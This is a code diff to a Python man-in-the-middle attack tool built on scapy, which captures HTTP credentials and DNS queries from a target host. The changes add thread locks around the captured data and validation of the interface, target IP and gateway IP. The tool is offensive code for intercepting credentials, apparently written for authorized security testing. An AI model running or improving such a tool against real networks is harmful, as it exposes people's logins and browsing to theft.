@@ -22,7 +22,7 @@ from scapy.layers.dns import DNS, DNSQR
 from scapy.sendrecv import sniff, send, srp
 from scapy.packet import Raw
 
-from utils import validate_interface, require_root, setup_logging
+from utils import validate_interface, validate_ip, require_root, setup_logging
 
 DEFAULT_CAPTURE_PORTS: list[int] = [80, 8080, 443, 21, 25, 110, 143]
 
@@ -58,6 +58,7 @@ class MitMAttack:
 
         self._captured_credentials: list[dict] = []
         self._captured_dns: list[dict] = []
+        self._lock = threading.Lock()
 
         self._spoof_thread: Optional[threading.Thread] = None
         self._sniff_thread: Optional[threading.Thread] = None
@@ -121,7 +122,8 @@ class MitMAttack:
 
     def packet_handler(self, packet) -> None:
         """Process captured packets for HTTP credentials and DNS queries."""
-        self._packets_captured += 1
+        with self._lock:
+            self._packets_captured += 1
 
         if packet.haslayer(TCP) and packet.haslayer(Raw):
             self._extract_http_credentials(packet)
@@ -167,7 +169,8 @@ class MitMAttack:
                 "dst_port": dst_port,
                 "fields": found_fields,
             }
-            self._captured_credentials.append(credential_entry)
+            with self._lock:
+                self._captured_credentials.append(credential_entry)
             self.logger.info("Captured credentials from %s -> %s:%d: %s",
                              src_ip, dst_ip, dst_port, list(found_fields.keys()))
 
@@ -187,7 +190,8 @@ class MitMAttack:
                 "src_ip": src_ip,
                 "query": dns_query,
             }
-            self._captured_dns.append(dns_entry)
+            with self._lock:
+                self._captured_dns.append(dns_entry)
             self.logger.debug("DNS query from %s: %s", src_ip, dns_query)
         except Exception as e:
             self.logger.debug("DNS extraction error: %s", e)
@@ -211,6 +215,10 @@ class MitMAttack:
 
     def start(self) -> None:
         """Start the MitM attack: enable forwarding, resolve MACs, spoof + sniff."""
+        if not validate_interface(self.interface):
+            self.logger.error("Invalid interface: %s", self.interface)
+            return
+
         self.logger.info("Starting MitM attack: target=%s gateway=%s",
                          self.target_ip, self.gateway_ip)
 
@@ -297,9 +305,12 @@ class MitMAttack:
 
     def get_captured_data(self) -> dict:
         """Return captured credentials and DNS queries."""
+        with self._lock:
+            credentials = list(self._captured_credentials)
+            dns_queries = list(self._captured_dns)
         return {
-            "credentials": list(self._captured_credentials),
-            "dns_queries": list(self._captured_dns),
+            "credentials": credentials,
+            "dns_queries": dns_queries,
             "target_ip": self.target_ip,
             "gateway_ip": self.gateway_ip,
             "interface": self.interface,
@@ -311,15 +322,19 @@ class MitMAttack:
         elapsed = 0.0
         if self._start_time:
             elapsed = round(time.time() - self._start_time, 2)
+        with self._lock:
+            packets = self._packets_captured
+            cred_count = len(self._captured_credentials)
+            dns_count = len(self._captured_dns)
         return {
             "running": self._running,
             "target_ip": self.target_ip,
             "gateway_ip": self.gateway_ip,
             "target_mac": self._target_mac,
             "gateway_mac": self._gateway_mac,
-            "packets_captured": self._packets_captured,
-            "credentials_found": len(self._captured_credentials),
-            "dns_queries_captured": len(self._captured_dns),
+            "packets_captured": packets,
+            "credentials_found": cred_count,
+            "dns_queries_captured": dns_count,
             "elapsed_time": elapsed,
             "forward": self.forward,
         }
@@ -365,6 +380,20 @@ Note: For authorized security testing only.
 
     args = parser.parse_args()
     require_root()
+
+    logger = setup_logging("mitm_attack")
+
+    if not validate_interface(args.interface):
+        logger.error("Invalid interface name: %s", args.interface)
+        sys.exit(1)
+
+    if not validate_ip(args.target):
+        logger.error("Invalid target IP address: %s", args.target)
+        sys.exit(1)
+
+    if not validate_ip(args.gateway):
+        logger.error("Invalid gateway IP address: %s", args.gateway)
+        sys.exit(1)
 
     capture_ports = None
     if args.ports:
